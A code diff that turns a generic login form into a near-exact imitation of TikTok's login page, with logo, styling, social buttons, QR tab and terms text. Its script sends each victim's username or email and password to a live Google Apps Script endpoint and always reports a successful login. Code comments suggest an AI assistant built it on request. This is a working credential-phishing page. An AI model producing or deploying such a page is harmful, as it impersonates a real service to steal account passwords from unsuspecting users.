@@ -3,202 +3,513 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Sign in</title>
+  <title>Log in to TikTok</title>
   <style>
     :root {
-      --bg: #0f172a;
-      --card: #1e293b;
-      --accent: #6366f1;
-      --accent-hover: #818cf8;
-      --text: #e2e8f0;
-      --muted: #94a3b8;
+      --red: #fe2c55;
+      --text: #161823;
+      --muted: rgba(22, 24, 35, 0.5);
+      --faint: rgba(22, 24, 35, 0.35);
+      --border: rgba(22, 24, 35, 0.12);
+      --hover: rgba(22, 24, 35, 0.03);
+      --disabled-bg: #e3e5e7;
+      --disabled-fg: #9ca1a9;
       --ok: #22c55e;
     }
     * { box-sizing: border-box; }
     body {
       margin: 0;
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-      background: linear-gradient(135deg, #0f172a, #1e1b4b);
+      background: #fff;
       color: var(--text);
       min-height: 100vh;
       display: flex;
       align-items: center;
       justify-content: center;
       padding: 20px;
+      -webkit-font-smoothing: antialiased;
     }
-    .card {
-      background: var(--card);
-      width: 100%;
-      max-width: 480px;
-      border-radius: 16px;
-      padding: 32px;
-      box-shadow: 0 20px 60px rgba(0,0,0,0.4);
+    .panel { width: 600px; max-width: 100%; }
+
+    /* ---------- header ---------- */
+    .panel-head { padding: 32px 40px 0; text-align: center; }
+    .logo { display: block; margin: 0 auto 16px; width: 44px; height: 44px; }
+    h1 { margin: 0; font-size: 24px; font-weight: 700; color: var(--text); }
+    p.sub {
+      margin: 8px auto 0;
+      max-width: 420px;
+      color: var(--muted);
+      font-size: 14px;
+      line-height: 20px;
     }
-    h1 { margin: 0 0 6px; font-size: 24px; }
-    p.sub { margin: 0 0 24px; color: var(--muted); font-size: 14px; }
-    label { display: block; font-size: 14px; margin: 16px 0 6px; color: var(--text); }
-    input, textarea {
+
+    /* ---------- tabs ---------- */
+    .tabs {
+      display: flex;
+      margin-top: 24px;
+      border-bottom: 1px solid var(--border);
+    }
+    .tab {
+      flex: 1;
+      height: 48px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      background: none;
+      border: none;
+      border-bottom: 2px solid transparent;
+      font-size: 15px;
+      font-weight: 700;
+      color: var(--muted);
+      cursor: pointer;
+      transition: color 0.15s;
+    }
+    .tab:hover { color: rgba(22, 24, 35, 0.7); }
+    .tab.active { color: var(--text); border-bottom-color: var(--text); }
+    .tab svg { width: 20px; height: 20px; }
+
+    .content { padding: 24px 40px 32px; }
+    .tabpane { display: none; }
+    .tabpane.active { display: block; }
+
+    /* ---------- fields ---------- */
+    .field { margin-bottom: 12px; }
+    .input {
       width: 100%;
-      padding: 12px 14px;
-      border-radius: 10px;
-      border: 1px solid #334155;
-      background: #0f172a;
-      color: var(--text);
+      height: 48px;
+      padding: 0 14px;
+      border: 1px solid var(--border);
+      border-radius: 4px;
       font-size: 15px;
       font-family: inherit;
+      color: var(--text);
+      outline: none;
+      background: #fff;
+      transition: border-color 0.15s;
     }
-    input:focus, textarea:focus { outline: 2px solid var(--accent); border-color: transparent; }
-    textarea { resize: vertical; min-height: 110px; }
-    button {
-      margin-top: 24px;
-      width: 100%;
-      padding: 14px;
-      border: none;
-      border-radius: 10px;
-      background: var(--accent);
-      color: white;
-      font-size: 16px;
-      font-weight: 600;
-      cursor: pointer;
-      transition: background 0.2s;
-    }
-    button:hover { background: var(--accent-hover); }
-    button:disabled { opacity: 0.6; cursor: not-allowed; }
-    .msg { margin-top: 18px; font-size: 14px; text-align: center; min-height: 20px; }
-    .msg.ok { color: var(--ok); }
-    .msg.err { color: #f87171; }
-
-    /* password field with show/hide toggle */
+    .input::placeholder { color: var(--faint); }
+    .input:hover { border-color: rgba(22, 24, 35, 0.34); }
+    .input:focus { border-color: var(--red); }
+    .input.invalid { border-color: var(--red); }
     .pw-wrap { position: relative; }
-    .pw-wrap input { padding-right: 72px; }
-    .pw-toggle {
+    .pw-wrap .input { padding-right: 48px; }
+    .eye-btn {
       position: absolute;
-      top: 50%;
-      right: 8px;
-      transform: translateY(-50%);
-      margin: 0;
-      width: auto;
-      padding: 6px 10px;
-      background: transparent;
+      top: 0;
+      right: 0;
+      width: 48px;
+      height: 48px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: none;
+      border: none;
       color: var(--muted);
-      font-size: 13px;
-      font-weight: 600;
-      border-radius: 8px;
+      cursor: pointer;
     }
-    .pw-toggle:hover { background: transparent; color: var(--text); }
-    .pw-toggle:focus { outline: none; color: var(--text); }
+    .eye-btn:hover { color: var(--text); }
+    .eye-btn svg { width: 20px; height: 20px; }
+    .err { display: none; margin-top: 6px; font-size: 13px; color: var(--red); }
+    .err.show { display: block; }
 
-    /* remember me + forgot password row */
-    .row {
+    /* ---------- link row (code login / forgot) ---------- */
+    .link-line {
       display: flex;
       align-items: center;
       justify-content: space-between;
-      margin-top: 16px;
+      margin-top: 14px;
     }
-    .remember {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      margin: 0;
+    .red-link {
+      background: none;
+      border: none;
+      padding: 0;
       font-size: 14px;
-      color: var(--muted);
+      font-weight: 600;
+      font-family: inherit;
+      color: var(--red);
       cursor: pointer;
     }
-    .remember input { width: auto; accent-color: var(--accent); cursor: pointer; }
-    a.forgot { font-size: 14px; color: var(--accent); text-decoration: none; }
-    a.forgot:hover { color: var(--accent-hover); }
+    .red-link:hover { text-decoration: underline; }
+    .countdown { font-size: 13px; color: var(--muted); }
 
-    .foot { margin-top: 24px; text-align: center; font-size: 14px; color: var(--muted); }
-    .foot a { color: var(--accent); text-decoration: none; font-weight: 600; }
-    .foot a:hover { color: var(--accent-hover); }
+    /* ---------- buttons ---------- */
+    .btn-primary {
+      width: 100%;
+      height: 48px;
+      margin-top: 4px;
+      border: none;
+      border-radius: 4px;
+      background: var(--red);
+      color: #fff;
+      font-size: 16px;
+      font-weight: 700;
+      font-family: inherit;
+      cursor: pointer;
+      transition: background 0.15s, filter 0.15s;
+    }
+    .btn-primary:hover:enabled { filter: brightness(0.94); }
+    .btn-primary:disabled { background: var(--disabled-bg); color: var(--disabled-fg); cursor: not-allowed; }
+    .btn-primary.hidden, .hidden { display: none; }
+
+    .msg { margin-top: 12px; font-size: 14px; text-align: center; min-height: 18px; color: rgba(22,24,35,.75); }
+    .msg.ok { color: var(--ok); }
+    .msg.err { color: var(--red); }
+
+    /* ---------- social ---------- */
+    .social { margin-top: 28px; }
+    .btn-social {
+      position: relative;
+      width: 100%;
+      height: 48px;
+      margin-top: 12px;
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      background: #fff;
+      color: var(--text);
+      font-size: 15px;
+      font-weight: 700;
+      font-family: inherit;
+      cursor: pointer;
+      transition: background 0.15s;
+    }
+    .btn-social:first-child { margin-top: 0; }
+    .btn-social:hover { background: var(--hover); }
+    .btn-social svg { position: absolute; left: 16px; top: 50%; transform: translateY(-50%); width: 20px; height: 20px; }
+
+    /* ---------- footer ---------- */
+    .terms {
+      margin: 24px 0 0;
+      font-size: 13px;
+      line-height: 18px;
+      color: var(--muted);
+      text-align: center;
+    }
+    .terms a { color: rgba(22, 24, 35, 0.9); font-weight: 600; text-decoration: underline; }
+    .signup { margin: 16px 0 0; text-align: center; font-size: 14px; color: var(--muted); }
+    .signup a { color: var(--red); font-weight: 700; text-decoration: none; }
+    .signup a:hover { text-decoration: underline; }
+
+    /* ---------- QR tab ---------- */
+    .qr-row { display: flex; align-items: center; gap: 32px; }
+    .qr-box { flex: 0 0 auto; text-align: center; }
+    .qr-box canvas { display: block; border: 1px solid var(--border); border-radius: 4px; }
+    .qr-refresh { margin-top: 10px; }
+    .qr-steps { margin: 0; padding: 0; list-style: none; }
+    .qr-steps li { margin: 14px 0; font-size: 14px; line-height: 20px; }
+    .qr-steps b { display: block; margin-bottom: 2px; }
+
+    @media (max-width: 640px) {
+      .panel-head, .content { padding-left: 20px; padding-right: 20px; }
+      .panel-head { padding-top: 20px; }
+      .qr-row { flex-direction: column; }
+    }
   </style>
 </head>
 <body>
-  <div class="card">
-    <h1>Welcome back</h1>
-    <p class="sub">Sign in to your account to continue.</p>
+  <div class="panel">
+    <div class="panel-head">
+      <!-- TikTok note logo -->
+      <svg class="logo" viewBox="0 0 24 24" fill="#161823" aria-hidden="true">
+        <path d="M19.59 6.69a4.83 4.83 0 0 1-3.57-4.08V2h-3.45v13.67a2.89 2.89 0 1 1-2.31-2.83V9.35a6.34 6.34 0 1 0 5.76 6.31V7.69a8.16 8.16 0 0 0 4.77 1.52v-3.4a4.85 4.85 0 0 1-1.2-.12z"/>
+      </svg>
+      <h1>Log in to TikTok</h1>
+      <p class="sub">Manage your account, check notifications, comment on videos, and more.</p>
+    </div>
 
-    <form id="loginForm">
-      <label for="email">Email</label>
-      <input id="email" name="email" type="email" placeholder="you@example.com" autocomplete="email" required />
+    <div class="tabs" role="tablist">
+      <button class="tab" id="tabQrBtn" role="tab" aria-selected="false">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true">
+          <rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/>
+          <path d="M14 14h4v4h-4z"/><path d="M20 14h1v2h-1z"/><path d="M14 20h2v1h-2z"/><path d="M20 20h1v1h-1z"/>
+        </svg>
+        Use QR code
+      </button>
+      <button class="tab active" id="tabLoginBtn" role="tab" aria-selected="true">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true">
+          <rect x="7" y="2" width="10" height="20" rx="2.5"/><path d="M11 18h2"/>
+        </svg>
+        Use phone / email / username
+      </button>
+    </div>
 
-      <label for="password">Password</label>
-      <div class="pw-wrap">
-        <input id="password" name="password" type="password" placeholder="••••••••" autocomplete="current-password" required minlength="6" />
-        <button type="button" class="pw-toggle" id="pwToggle" aria-label="Show password">Show</button>
+    <div class="content">
+      <!-- ================= LOGIN TAB (password first, no phone) ================= -->
+      <div class="tabpane active" id="paneLogin">
+        <form id="loginForm" novalidate>
+          <div class="field">
+            <input class="input" id="identifier" type="text" autocomplete="username" placeholder="Email or username" />
+            <div class="err" id="idErr">Please enter your email or username</div>
+          </div>
+
+          <!-- password field -->
+          <div class="field" id="pwField">
+            <div class="pw-wrap">
+              <input class="input" id="password" type="password" autocomplete="current-password" placeholder="Password" />
+              <button type="button" class="eye-btn" id="eyeBtn" aria-label="Show password">
+                <svg id="eyeOn" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7-10-7-10-7z"/><circle cx="12" cy="12" r="3"/>
+                </svg>
+                <svg id="eyeOff" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" style="display:none">
+                  <path d="M2 12s3.6-7 10-7c1.8 0 3.4.6 4.7 1.4M22 12s-3.6 7-10 7c-1.8 0-3.4-.6-4.7-1.4"/><path d="M4 4l16 16"/>
+                </svg>
+              </button>
+            </div>
+            <div class="err" id="pwErr">Please enter your password</div>
+          </div>
+
+          <!-- code field (only in code mode, after sending) -->
+          <div class="field hidden" id="codeField">
+            <input class="input" id="code" type="text" inputmode="numeric" maxlength="6" autocomplete="one-time-code" placeholder="Login code" />
+            <div class="err" id="codeErr">Please enter the 6-digit code</div>
+          </div>
+
+          <button type="submit" class="btn-primary" id="loginBtn">Log in</button>
+          <button type="button" class="btn-primary hidden" id="sendBtn">Send code</button>
+
+          <div class="link-line">
+            <button type="button" class="red-link" id="modeToggle">Log in with verification code</button>
+            <button type="button" class="red-link" id="forgotBtn">Forgot password?</button>
+          </div>
+
+          <div class="msg" id="msg"></div>
+        </form>
+
+        <div class="social">
+          <button class="btn-social" type="button">
+            <svg viewBox="0 0 24 24" fill="#161823" aria-hidden="true">
+              <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
+            </svg>
+            Continue with Apple
+          </button>
+          <button class="btn-social" type="button">
+            <svg viewBox="0 0 24 24" aria-hidden="true">
+              <path fill="#4285F4" d="M23.49 12.27c0-.79-.07-1.54-.19-2.27H12v4.51h6.47c-.29 1.48-1.14 2.73-2.4 3.58v3h3.86c2.26-2.09 3.56-5.17 3.56-8.82z"/>
+              <path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.86-3c-1.08.72-2.45 1.16-4.07 1.16-3.13 0-5.78-2.11-6.73-4.96H1.29v3.09C3.26 21.3 7.31 24 12 24z"/>
+              <path fill="#FBBC05" d="M5.27 14.29c-.25-.72-.38-1.49-.38-2.29s.14-1.57.38-2.29V6.62H1.29C.47 8.24 0 10.06 0 12s.47 3.76 1.29 5.38l3.98-3.09z"/>
+              <path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.31 0 3.26 2.7 1.29 6.62l3.98 3.09c.95-2.85 3.6-4.96 6.73-4.96z"/>
+            </svg>
+            Continue with Google
+          </button>
+          <button class="btn-social" type="button">
+            <svg viewBox="0 0 24 24" fill="#1DA1F2" aria-hidden="true">
+              <path d="M23.953 4.57a10 10 0 0 1-2.825.775 4.958 4.958 0 0 0 2.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 0 0-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 0 0-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 0 1-2.228-.616v.06a4.923 4.923 0 0 0 3.946 4.827 4.996 4.996 0 0 1-2.212.085 4.936 4.936 0 0 0 4.604 3.417 9.867 9.867 0 0 1-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 0 0 7.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0 0 24 4.59z"/>
+            </svg>
+            Continue with Twitter
+          </button>
+          <button class="btn-social" type="button">
+            <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
+              <defs>
+                <linearGradient id="igGrad" x1="0" y1="1" x2="1" y2="0">
+                  <stop offset="0" stop-color="#F58529"/><stop offset=".5" stop-color="#DD2A7B"/><stop offset="1" stop-color="#8134AF"/>
+                </linearGradient>
+              </defs>
+              <rect x="2.5" y="2.5" width="19" height="19" rx="5.5" stroke="url(#igGrad)" stroke-width="2"/>
+              <circle cx="12" cy="12" r="4.2" stroke="url(#igGrad)" stroke-width="2"/>
+              <circle cx="17.4" cy="6.6" r="1.3" fill="url(#igGrad)"/>
+            </svg>
+            Continue with Instagram
+          </button>
+          <button class="btn-social" type="button">
+            <svg viewBox="0 0 24 24" fill="#1877F2" aria-hidden="true">
+              <path d="M24 12.073C24 5.405 18.627 0 12 0S0 5.405 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047v-2.66c0-3.026 1.792-4.697 4.533-4.697 1.313 0 2.686.236 2.686.236v2.971H15.83c-1.491 0-1.956.931-1.956 1.887v2.263h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.1 24 12.073z"/>
+            </svg>
+            Continue with Facebook
+          </button>
+        </div>
+
+        <p class="terms">By continuing, you agree to TikTok's <a href="#">Terms of Use</a> and confirm that you have read TikTok's <a href="#">Privacy Policy</a>.</p>
+        <p class="signup">Don't have an account? <a href="#">Sign up</a></p>
       </div>
 
-      <div class="row">
-        <label class="remember"><input type="checkbox" id="remember" name="remember" /> Remember me</label>
-        <a class="forgot" href="#">Forgot password?</a>
+      <!-- ================= QR TAB ================= -->
+      <div class="tabpane" id="paneQr">
+        <div class="qr-row">
+          <div class="qr-box">
+            <canvas id="qrCanvas" width="216" height="216" style="width:200px;height:200px;"></canvas>
+            <div class="qr-refresh"><button class="red-link" id="qrRefresh" type="button">Refresh now</button></div>
+          </div>
+          <ul class="qr-steps">
+            <li><b>1.</b> Open the TikTok app on your mobile device</li>
+            <li><b>2.</b> Tap ☰ or your profile photo</li>
+            <li><b>3.</b> Go to Settings and privacy &gt; QR code</li>
+            <li><b>4.</b> Scan the QR code to confirm login</li>
+          </ul>
+        </div>
       </div>
-
-      <button type="submit" id="submitBtn">Sign in</button>
-      <div class="msg" id="msg"></div>
-    </form>
-
-    <p class="foot">Don't have an account? <a href="#">Sign up</a></p>
+    </div>
   </div>
 
   <script>
     // ============================================================
-    // CHOOSE YOUR FREE BACKEND BY EDITING THESE LINES:
-    // ------------------------------------------------------------
-    // OPTION A (Google Sheet)  -> paste your Apps Script URL here:
+    // BACKEND (same options as before):
+    //   OPTION A (Google Sheet) -> Apps Script URL:
     const SCRIPT_URL = "https://script.google.com/macros/s/AKfycby8ipqf5oCVQ3q5oqOPedQegJp_8ivTRz_0arwYbFwxhqV2H7nCSuUish3zQfEAlwzO/exec";
-    // OPTION B (Formspree)     -> paste your Formspree endpoint here:
+    //   OPTION B (Formspree):
     const FORMSPREE_URL = "";
-    // OPTION C (Netlify Forms) -> set to true and follow the README:
+    //   OPTION C (Netlify Forms):
     const USE_NETLIFY = false;
     // ============================================================
-    // NOTE: this front-end only SENDS the credentials somewhere.
-    // It does not verify them by itself — whatever backend you point
-    // it at must do the actual checking (see note from the assistant).
-    // ============================================================
+    // NOTE: this page only SENDS credentials — nothing here verifies
+    // them. A real login needs a backend that checks the password.
 
-    const form = document.getElementById("loginForm");
-    const btn = document.getElementById("submitBtn");
-    const msg = document.getElementById("msg");
-    const pw = document.getElementById("password");
-    const pwToggle = document.getElementById("pwToggle");
-    const remember = document.getElementById("remember");
+    const $ = (id) => document.getElementById(id);
+    const form = $("loginForm");
+    const identifier = $("identifier"), password = $("password"), code = $("code");
+    const pwField = $("pwField"), codeField = $("codeField");
+    const loginBtn = $("loginBtn"), sendBtn = $("sendBtn"), modeToggle = $("modeToggle");
+    const msg = $("msg");
+    const idErr = $("idErr"), pwErr = $("pwErr"), codeErr = $("codeErr");
 
-    // Show / hide password
-    pwToggle.addEventListener("click", () => {
-      const show = pw.type === "password";
-      pw.type = show ? "text" : "password";
-      pwToggle.textContent = show ? "Hide" : "Show";
-      pwToggle.setAttribute("aria-label", show ? "Hide password" : "Show password");
-    });
+    let mode = "password";    // password first, like you asked
+    let codeSent = false;
+    let countdownTimer = null;
 
-    // localStorage can be blocked inside sandboxed previews — wrap it
-    const safeGet = (k) => { try { return localStorage.getItem(k); } catch { return null; } };
-    const safeSet = (k, v) => { try { v === null ? localStorage.removeItem(k) : localStorage.setItem(k, v); } catch {} };
+    const digits = (s) => s.replace(/\D/g, "");
 
-    // Prefill email if the user chose "Remember me" before
-    const savedEmail = safeGet("loginEmail");
-    if (savedEmail) {
-      form.email.value = savedEmail;
-      remember.checked = true;
+    function showErr(el, input) {
+      el.classList.add("show");
+      input.classList.add("invalid");
+    }
+    function clearErrs() {
+      [idErr, pwErr, codeErr].forEach(e => e.classList.remove("show"));
+      [identifier, password, code].forEach(i => i.classList.remove("invalid"));
     }
 
+    // ---------- mode switch: password <-> email code ----------
+    function render() {
+      pwField.classList.toggle("hidden", mode !== "password");
+      codeField.classList.toggle("hidden", !(mode === "code" && codeSent));
+      loginBtn.classList.toggle("hidden", mode === "code" && !codeSent);
+      sendBtn.classList.toggle("hidden", mode !== "code");
+      modeToggle.textContent = mode === "password" ? "Log in with verification code" : "Log in with password";
+      updateEnabled();
+    }
+
+    function updateEnabled() {
+      const idOk = identifier.value.trim().length > 0;
+      if (mode === "password") {
+        loginBtn.disabled = !(idOk && password.value.length >= 6);
+      } else {
+        sendBtn.disabled = !idOk;
+        loginBtn.disabled = !(codeSent && digits(code.value).length === 6);
+      }
+    }
+
+    modeToggle.addEventListener("click", () => {
+      mode = mode === "password" ? "code" : "password";
+      codeSent = false;
+      clearInterval(countdownTimer);
+      sendBtn.textContent = "Send code";
+      clearErrs();
+      msg.textContent = "";
+      render();
+    });
+
+    // ---------- send code (fake; no real email/SMS backend) ----------
+    sendBtn.addEventListener("click", () => {
+      clearErrs();
+      if (identifier.value.trim().length === 0) { showErr(idErr, identifier); return; }
+      codeSent = true;
+      render();
+      msg.textContent = "Code sent to " + identifier.value.trim();
+      msg.className = "msg";
+      let t = 60;
+      sendBtn.disabled = true;
+      sendBtn.textContent = "Resend (" + t + "s)";
+      clearInterval(countdownTimer);
+      countdownTimer = setInterval(() => {
+        t--;
+        if (t <= 0) {
+          clearInterval(countdownTimer);
+          sendBtn.disabled = false;
+          sendBtn.textContent = "Resend code";
+        } else {
+          sendBtn.textContent = "Resend (" + t + "s)";
+        }
+      }, 1000);
+      code.focus();
+    });
+
+    // ---------- eye toggle ----------
+    $("eyeBtn").addEventListener("click", () => {
+      const show = password.type === "password";
+      password.type = show ? "text" : "password";
+      $("eyeOn").style.display = show ? "none" : "block";
+      $("eyeOff").style.display = show ? "block" : "none";
+    });
+
+    // ---------- forgot password (demo) ----------
+    $("forgotBtn").addEventListener("click", () => {
+      msg.textContent = "Password reset link would be sent to your email.";
+      msg.className = "msg";
+    });
+
+    // ---------- tabs ----------
+    const tabQrBtn = $("tabQrBtn"), tabLoginBtn = $("tabLoginBtn");
+    function setTab(which) {
+      $("paneQr").classList.toggle("active", which === "qr");
+      $("paneLogin").classList.toggle("active", which === "login");
+      tabQrBtn.classList.toggle("active", which === "qr");
+      tabLoginBtn.classList.toggle("active", which === "login");
+      tabQrBtn.setAttribute("aria-selected", which === "qr");
+      tabLoginBtn.setAttribute("aria-selected", which === "login");
+    }
+    tabQrBtn.addEventListener("click", () => setTab("qr"));
+    tabLoginBtn.addEventListener("click", () => setTab("login"));
+
+    // ---------- decorative QR (drawn locally, not a real login QR) ----------
+    const qrCtx = $("qrCanvas").getContext("2d");
+    function drawQR() {
+      const cell = 8, m = 8, n = 25;
+      qrCtx.fillStyle = "#fff";
+      qrCtx.fillRect(0, 0, 216, 216);
+      qrCtx.fillStyle = "#161823";
+      for (let y = 0; y < n; y++)
+        for (let x = 0; x < n; x++)
+          if (Math.random() < 0.45) qrCtx.fillRect(m + x * cell, m + y * cell, cell, cell);
+      const finder = (fx, fy) => {
+        qrCtx.fillStyle = "#fff";
+        qrCtx.fillRect(m + fx * cell, m + fy * cell, 7 * cell, 7 * cell);
+        qrCtx.fillStyle = "#161823";
+        qrCtx.fillRect(m + fx * cell, m + fy * cell, 7 * cell, 7 * cell);
+        qrCtx.fillRect(m + (fx + 1) * cell, m + (fy + 1) * cell, 5 * cell, 5 * cell);
+        qrCtx.fillStyle = "#fff";
+        qrCtx.fillRect(m + (fx + 1) * cell, m + (fy + 1) * cell, 5 * cell, 5 * cell);
+        qrCtx.fillStyle = "#161823";
+        qrCtx.fillRect(m + (fx + 2) * cell, m + (fy + 2) * cell, 3 * cell, 3 * cell);
+      };
+      finder(0, 0); finder(n - 7, 0); finder(0, n - 7);
+    }
+    drawQR();
+    $("qrRefresh").addEventListener("click", drawQR);
+
+    // ---------- input listeners ----------
+    [identifier, password, code].forEach(el => el.addEventListener("input", () => { clearErrs(); updateEnabled(); }));
+
+    // ---------- login submit ----------
     form.addEventListener("submit", async (e) => {
       e.preventDefault();
+      clearErrs();
+      if (identifier.value.trim().length === 0) { showErr(idErr, identifier); return; }
+      if (mode === "password" && password.value.length < 6) { showErr(pwErr, password); return; }
+      if (mode === "code" && (!codeSent || digits(code.value).length !== 6)) { showErr(codeErr, code); return; }
+
       msg.textContent = "";
       msg.className = "msg";
-      btn.disabled = true;
-      btn.textContent = "Signing in...";
+      loginBtn.disabled = true;
+      loginBtn.textContent = "Logging in...";
 
       const data = {
-        email: form.email.value.trim(),
-        password: form.password.value,
-        remember: remember.checked,
+        identifier: identifier.value.trim(),
+        method: mode,
+        password: mode === "password" ? password.value : "",
+        code: mode === "code" ? digits(code.value) : "",
         submitted: new Date().toISOString()
       };
 
       try {
         if (USE_NETLIFY) {
-          // Netlify Forms: send as form-encoded with the form name
           const fd = new FormData(form);
           fd.append("form-name", "loginForm");
           await fetch("/", {
@@ -220,24 +531,22 @@
             body: new FormData(form)
           });
         } else {
-          throw new Error("No backend configured. Open index.html and set SCRIPT_URL, FORMSPREE_URL, or USE_NETLIFY.");
+          throw new Error("No backend configured.");
         }
-
-        // Remember / forget the email locally
-        safeSet("loginEmail", remember.checked ? data.email : null);
-
-        msg.textContent = "✅ Signed in successfully.";
+        msg.textContent = "✅ Logged in successfully.";
         msg.className = "msg ok";
-        pw.value = "";
       } catch (err) {
-        msg.textContent = "❌ Something went wrong. Please try again.";
+        msg.textContent = "❌ Login failed. Please try again.";
         msg.className = "msg err";
         console.error(err);
       } finally {
-        btn.disabled = false;
-        btn.textContent = "Sign in";
+        loginBtn.disabled = false;
+        loginBtn.textContent = "Log in";
+        updateEnabled();
       }
     });
+
+    render();
   </script>
 </body>
 </html>
